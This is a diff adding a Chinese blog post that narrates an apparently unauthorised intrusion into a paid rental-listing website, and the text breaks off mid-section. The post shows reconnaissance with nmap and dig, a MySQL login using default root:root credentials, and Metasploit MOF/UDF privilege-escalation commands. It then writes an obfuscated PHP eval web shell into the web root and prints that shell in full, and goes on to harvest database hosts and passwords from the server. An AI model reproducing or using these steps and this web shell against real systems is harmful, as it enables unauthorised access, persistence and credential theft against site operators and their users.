@@ -1,0 +1,1321 @@
+<!doctype html>
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+    
+
+    
+  
+
+  
+    
+
+    
+  
+
+  
+    
+
+    
+  
+
+  
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Kalam:300,300italic,400,400italic,700,700italicUbuntu:300,300italic,400,400italic,700,700italicSatisfy:300,300italic,400,400italic,700,700italicInconsolata:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="渗透测试小记," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="作为一名，怀揣远(ri)大(tian)理(ri)想(di)的北漂，永远离不开租房子的话题，58.链家.我爱我家…各种中介坑的我心慌，想直接找个房东整租一个，偶然间了解到到xx网站是专为中介统计的房东房源，当然是花钱的（MLGB），遂引发了一下惨案。人狠话不多，整！">
+<meta name="keywords" content="渗透测试小记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试小记-由租房引发的惨案">
+<meta property="og:url" content="https://kionf.com/2018/09/11/hack-note-00100/index.html">
+<meta property="og:site_name" content="Kionf">
+<meta property="og:description" content="作为一名，怀揣远(ri)大(tian)理(ri)想(di)的北漂，永远离不开租房子的话题，58.链家.我爱我家…各种中介坑的我心慌，想直接找个房东整租一个，偶然间了解到到xx网站是专为中介统计的房东房源，当然是花钱的（MLGB），遂引发了一下惨案。人狠话不多，整！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00101.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00102.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00103.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00104.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00105.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00106.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00107.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00108.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00109.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00110.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00111.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00112.kpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00113.jpg">
+<meta property="og:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00114.jpg">
+<meta property="og:updated_time" content="2018-09-13T05:07:27.172Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试小记-由租房引发的惨案">
+<meta name="twitter:description" content="作为一名，怀揣远(ri)大(tian)理(ri)想(di)的北漂，永远离不开租房子的话题，58.链家.我爱我家…各种中介坑的我心慌，想直接找个房东整租一个，偶然间了解到到xx网站是专为中介统计的房东房源，当然是花钱的（MLGB），遂引发了一下惨案。人狠话不多，整！">
+<meta name="twitter:image" content="https://kionf.com/article_iamges/hack-note-00100/hack-note-00101.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://kionf.com/2018/09/11/hack-note-00100/"/>
+
+
+
+
+
+  <title>渗透测试小记-由租房引发的惨案 | Kionf</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-80809114-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title title motto-shake" data-text="Kionf"></span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://kionf.com/2018/09/11/hack-note-00100/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Kionf">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kionf">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">渗透测试小记-由租房引发的惨案</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-11T00:00:00+08:00">
+                2018-09-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/hack-note/" itemprop="url" rel="index">
+                    <span itemprop="name">hack-note</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/09/11/hack-note-00100/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/09/11/hack-note-00100/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote class="blockquote-center"><p>作为一名，怀揣远(ri)大(tian)理(ri)想(di)的北漂，永远离不开租房子的话题，58.链家.我爱我家…各种中介坑的我心慌，想直接找个房东整租一个，偶然间了解到到xx网站是专为中介统计的房东房源，当然是花钱的（MLGB），遂引发了一下惨案。人狠话不多，整！</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h1><h2 id="1-ok首先拿到网站后，先打开官网瞅了瞅"><a href="#1-ok首先拿到网站后，先打开官网瞅了瞅" class="headerlink" title="1. ok首先拿到网站后，先打开官网瞅了瞅:"></a>1. ok首先拿到网站后，先打开官网瞅了瞅:</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00101.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>简单分析为<code>PHP</code>写的，没有登陆房东的手机号为打码状态，凌晨1点半的我，脸上逐渐漏出笑容  ：）</p>
+<h2 id="2-随便输入一个地址："><a href="#2-随便输入一个地址：" class="headerlink" title="2. 随便输入一个地址："></a>2. 随便输入一个地址：</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00102.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>看到这个丧逼脸，经验告诉我TM就是这是 <code>ThinkPhp</code>框架</p>
+<h2 id="3-在搞个随便输入个404地址"><a href="#3-在搞个随便输入个404地址" class="headerlink" title="3. 在搞个随便输入个404地址"></a>3. 在搞个随便输入个404地址</h2><span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00103.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>综合以上手撸，分析大概环境为：</p>
+<figure class="highlight bash"><figcaption><span class="caption">环境</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">IIS + ThinkPHP + php + Windows</div></pre></div></div></figure>
+<blockquote>
+<p>此结果为手测，经验不足可以使用whatweb检测web环境</p>
+</blockquote>
+<figure class="highlight bash"><figcaption><span class="caption">whatweb xxx</span><span class="suffix">.com</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">http://xxx.com/index.php/Manage/Login/index [200 OK] Cookies[BJYADMIN], Country[CHINA][CN], HTML5, HTTPServer[Microsoft-IIS/7.0], IP[115.28.xxx.xxx], JQuery[1.11.1], Microsoft-IIS[7.0], PasswordField[password], Script[JavaScript,javascript,text/javascript], Title[管理系统], X-Powered-By[thinkphp-bjyadmin, ASP.NET], X-UA-Compatible[IE=edge]</div></pre></div></div></figure>
+<h2 id="4-域名分析"><a href="#4-域名分析" class="headerlink" title="4. 域名分析"></a>4. 域名分析</h2><figure class="highlight bash"><figcaption><span class="caption">dig xxx</span><span class="suffix">.com</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; xxx.com</div><div class="line">;; global options: +cmd</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 364</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</div><div class="line"></div><div class="line">;; OPT PSEUDOSECTION:</div><div class="line">; EDNS: version: 0, flags:; udp: 4096</div><div class="line">;; QUESTION SECTION:</div><div class="line">;lx808.com.			IN	A</div><div class="line"></div><div class="line">;; ANSWER SECTION:</div><div class="line">xxx.com.		3599	IN	CNAME	www.xxx.com.xxx.com.</div><div class="line">www.xxx.com.xxx.com. 3600	IN	A	115.28.xxx.xxx</div><div class="line"></div><div class="line">;; Query time: 1370 msec</div><div class="line">;; SERVER: 108.61.10.10<span class="comment">#53(108.61.10.10)</span></div><div class="line">;; WHEN: Tue Sep 11 18:51:58 CST 2018</div><div class="line">;; MSG SIZE  rcvd: 82</div></pre></div></div></figure>
+<p>获取到<code>ip：115.28.xxx.xxx</code>，查看是IP相关信息：<br><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">```bash :curl cip.cc/115.28.xxx.xxx line_number:false</div><div class="line">IP	: 115.28.xxx.xxx</div><div class="line">地址	: 中国  山东  青岛</div><div class="line">运营商	: 阿里云</div><div class="line"></div><div class="line">数据二	: 山东省青岛市 | 阿里巴巴网络有限公司BGP数据中心</div><div class="line"></div><div class="line">URL	: http://www.cip.cc/115.28.xxx.xxx</div></pre></div></div></figure></p>
+<h2 id="5-主机信息"><a href="#5-主机信息" class="headerlink" title="5. 主机信息"></a>5. 主机信息</h2><p>脚本小子，上！<code>nmap</code> 扫描</p>
+<figure class="highlight bash"><figcaption><span class="caption">nmap -sV -T4 -O -F --version-light 115.28.xxx</span><span class="suffix">.xxx</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></div><div class="code"><pre><div class="line">Nmap scan report <span class="keyword">for</span> 115.28.xxx.xxx</div><div class="line">Host is up (0.19s latency).</div><div class="line">Not shown: 83 closed ports</div><div class="line">PORT      STATE    SERVICE       VERSION</div><div class="line">25/tcp    filtered smtp</div><div class="line">80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class="line">135/tcp   filtered msrpc</div><div class="line">139/tcp   filtered netbios-ssn</div><div class="line">445/tcp   filtered microsoft-ds</div><div class="line">1027/tcp  filtered IIS</div><div class="line">1028/tcp  filtered unknown</div><div class="line">3128/tcp  filtered squid-http</div><div class="line">3306/tcp  open     mysql         MySQL 5.5.40</div><div class="line">3389/tcp  open     ms-wbt-server Microsoft Terminal Service</div><div class="line">5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class="line">8009/tcp  open     ajp13         Apache Jserv (Protocol v1.3)</div><div class="line">8080/tcp  open     http          Apache Tomcat/Coyote JSP engine 1.1</div><div class="line">49152/tcp open     unknown</div><div class="line">49153/tcp open     unknown</div><div class="line">49154/tcp open     unknown</div><div class="line">49155/tcp open     unknown</div></pre></div></div></figure>
+<p>其中有两个个让人非常感兴趣的服务及端口：</p>
+<figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">3306	Mysql</div><div class="line">3389	RDP</div></pre></div></div></figure>
+<h1 id="0x01-渗透"><a href="#0x01-渗透" class="headerlink" title="0x01 渗透"></a>0x01 渗透</h1><h2 id="1-随手一输入带来的惊喜！"><a href="#1-随手一输入带来的惊喜！" class="headerlink" title="1. 随手一输入带来的惊喜！"></a>1. 随手一输入带来的惊喜！</h2><p>看到常用端口都没有更改，对外暴露。猜测安全意识估计也是很TM薄弱，随便用<code>root</code>：<code>root</code>连接mysql。</p>
+<p><br></p>
+<p><strong>Duang, Duang, Duang</strong></p>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00104.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<blockquote>
+<p>有时候就是这样百密一疏，安全问题的重中之重就是细节<br>可能你在想这么Low逼也好意思写？那么你错了，重头戏在后头！</p>
+</blockquote>
+<p>连接后，查看了一下数据库，根据名称找到当前网站所使用数据库。根据表名找到大概为用户账号密码信息表</p>
+<hr>
+
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00105.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>已到夜深，不想再劳体伤身，随便找个用户名，md5密码扔到<a href="http://www.dmd5.com/" target="_blank" rel="noopener">dmd5</a>解密出明文，本以为能登陆这事儿就算了，放他一马。</p>
+<blockquote>
+<p><strong>But !</strong></p>
+</blockquote>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00106.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>提示账号密码错误，又尝试了几个账号发现，被禁用 ！！通过查看数据库记录的登陆信息and猜测，得出应该现在的网站并没有连接此数据库。深夜的我扣了扣脚丫子，发现事情并没有那么简单。</p>
+<p><br></p>
+<p>虽然没有使用现在的数据库，但我们是有<code>root</code>登陆到数据库的啊，权限高啊，提权啊！</p>
+<p><strong>Let’s Go</strong></p>
+<hr>
+
+<h2 id="2-常用Low逼Mysql提权几种方式："><a href="#2-常用Low逼Mysql提权几种方式：" class="headerlink" title="2. 常用Low逼Mysql提权几种方式："></a>2. 常用Low逼Mysql提权几种方式：</h2><ul>
+<li>UDF提权</li>
+<li>MOF提权</li>
+<li><code>into dumpfile</code>写入shell</li>
+</ul>
+<p>祭出我的宝贝 <code>metasploit</code></p>
+<h3 id="1-MOF提权"><a href="#1-MOF提权" class="headerlink" title="1) MOF提权"></a>1) MOF提权</h3><figure class="highlight bash"><figcaption><span class="caption">脚本小子三部曲</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># 1. 启动msf选择exploit</span></div><div class="line"></div><div class="line">&gt; msfconsole</div><div class="line"></div><div class="line">&gt; search mysql_mof</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                             Disclosure Date  Rank       Description</div><div class="line">   ----                             ---------------  ----       -----------</div><div class="line">   exploit/windows/mysql/mysql_mof  2012-12-01       excellent  Oracle MySQL <span class="keyword">for</span> Microsoft Windows MOF Execution</div><div class="line"></div><div class="line">&gt; use exploit/windows/mysql/mysql_mof</div><div class="line"></div><div class="line"><span class="comment"># 2. 设置目标</span></div><div class="line"></div><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/mysql/mysql_mof):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   PASSWORD                   yes       The password to authenticate with</div><div class="line">   RHOST                      yes       The target address</div><div class="line">   RPORT     3306             yes       The target port (TCP)</div><div class="line">   USERNAME                   yes       The username to authenticate as</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   MySQL on Windows prior to Vista</div><div class="line"></div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div><div class="line"></div><div class="line"><span class="comment"># 3. 启动</span></div><div class="line">&gt; exploit</div><div class="line"></div><div class="line">&gt; `show advanced`显示高级选项，进行自定义</div></pre></div></div></figure>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00107.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>命令执行成功，没有返回session， 利用程序可能被删除</p>
+<hr>
+
+<h3 id="2-UDF提权"><a href="#2-UDF提权" class="headerlink" title="2) UDF提权"></a>2) UDF提权</h3><figure class="highlight bash"><figcaption><span class="caption">尝试UDF提权</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line">msf exploit(windows/mysql/mysql_mof) &gt; search mysql_udf</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank       Description</div><div class="line">   ----                                   ---------------  ----       -----------</div><div class="line">   exploit/multi/mysql/mysql_udf_payload  2009-01-16       excellent  Oracle MySQL UDF Payload Execution</div><div class="line"></div><div class="line">&gt; use exploit/multi/mysql/mysql_udf_payload</div><div class="line">&gt; show options</div><div class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</div><div class="line">&gt; <span class="built_in">set</span> PASSWORD root</div><div class="line">&gt; <span class="built_in">set</span> USERNAME root</div></pre></div></div></figure>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00108.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>注意红框圈出位置，根据目录结构判断是PhpStudy搭建的，后面会使用到</p>
+<p>依旧没有成功返回session，有尝试了几次MOF，发现连接Mysql被拒绝了。这时才想起机器时部署在阿里云，有一个<code>AliYunDun</code>这个小可爱，上面MOF的提权文件应该也是他删除的。</p>
+<hr>
+
+<h3 id="3-尝试写入WebShell"><a href="#3-尝试写入WebShell" class="headerlink" title="3) 尝试写入WebShell"></a>3) 尝试写入WebShell</h3><p>由上面在进行UDF提权时爆出来的是使用<code>PhpStudy</code>搭建的web环境，使用代理连接目标Mysql执行：</p>
+<figure class="highlight sql"><figcaption><span class="caption">查看Mysql datadir</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">&gt; select @@datadir;</div><div class="line"></div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| @@datadir                   |</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| D:\phpStudy4IIS\MySQL\data\ |</div><div class="line">+<span class="comment">-----------------------------+</span></div></pre></div></div></figure>
+<p>本机下载相对应版本<code>安装包</code>，安装后查看到默认Web路径为<code>D:\phpStudy4IIS\WWW</code>。ok既然网站目录得到了并且通过之前的信息收集得到使用的是ThinkPHP，我们就尝试写入PHP一句话Shell。</p>
+<figure class="highlight sql"><figcaption><span class="caption">连接目标Mysql写入Web Shell</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -proot -h115.28.xxx.xxx mysql</div><div class="line"></div><div class="line"># 写入PHP shell</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/root/sys_thinkphp.php'</span>) <span class="keyword">into</span> dump_file <span class="string">'D:\phpStudy4IIS\WWW'</span></div></pre></div></div></figure>
+<p>PHP Shell文件（自定义和正常菜刀不通用）：</p>
+<figure class="highlight php"><figcaption><span class="caption">sys_thinkphp</span><span class="suffix">.php</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$thinkss = create_function(<span class="string">'$a'</span>, <span class="string">'ev'</span>.<span class="string">'al($a);'</span>);</div><div class="line"></div><div class="line">$thinkss(stripslashes($_POST[<span class="string">'***REMOVED***'</span>]));</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></div></div></figure>
+<p>使用浏览器访问，没要报404。shell写入成功！！</p>
+<hr>
+
+<h2 id="3-进一步渗透"><a href="#3-进一步渗透" class="headerlink" title="3. 进一步渗透"></a>3. 进一步渗透</h2><p>使用菜刀连接：</p>
+<span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="https://kionf.com/article_iamges/hack-note-00100/hack-note-00109.jpg" class="full-image" alt="kionf"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span>
+<p>获取shell，通过查看目录结构、及asp、php、tomcat代码，这里省略一万字，获取如下信息：</p>
+<figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">环境:</div><div class="line">	tomcat7.0</div><div class="line">	IIS</div><div class="line">	mysql</div><div class="line">	aspx网站路径</div><div class="line"></div><div class="line">查看代码发现连接数据库为并得到密码:</div><div class="line">	Mysql: 114.215.xxx.xxx</div><div class="line">	Mysql: 115.29.xx.xxx</div><div class="line">	SqlServer: 115.29.xx.xxx</div></pre></div></div></figure>
+<p><strong>常用WEB服务配置文件位置：</strong></p>
+<figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">ThinkPhp:  ./www/ThinkPHP/Conf/       ./www/Application/Common/Conf/</div><div class="line">Tomcat: ./tomcat/webapps/appname/WEB-INF/classes/</div><div class="line">IIS: ./www/Web.config</div></pre></div></div></figure>
+<h2 id="4-休战"><a href="#4-休战" class="headerlink" title="4. 休战"></a>4. 休战</h2><p>通过查看php代码分析出，房源网站连接的是<code>SqlServer: 115.29.xx.xxx</code>，用户登录通过查询两个表名。mysql用户表记录用户可以登录ip数，及绑定ip。如果First字段为0则为首次登陆，首次登陆ip写入数据库，账号密码储存在SqlServer。  登陆之！</p>
+<hr>
+
+<h1 id="0x02-千里之堤，溃于蚁穴"><a href="#0x02-千里之堤，溃于蚁穴" class="headerlink" title="0x02 千里之堤，溃于蚁穴"></a>0x02 千里之堤，溃于蚁穴</h1><p><br></p>
+<p>在上面<a href="## 3-进一步渗透">进一步渗透中</a>中获取到一个数据库：</p>
+<blockquote>
+<p>Mysql: 114.215.xxx.xxx</p>
+</blockquote>
+<p>根据ThinkPHP框架配置文件中的账号密码，连接后查看数据库:</p>
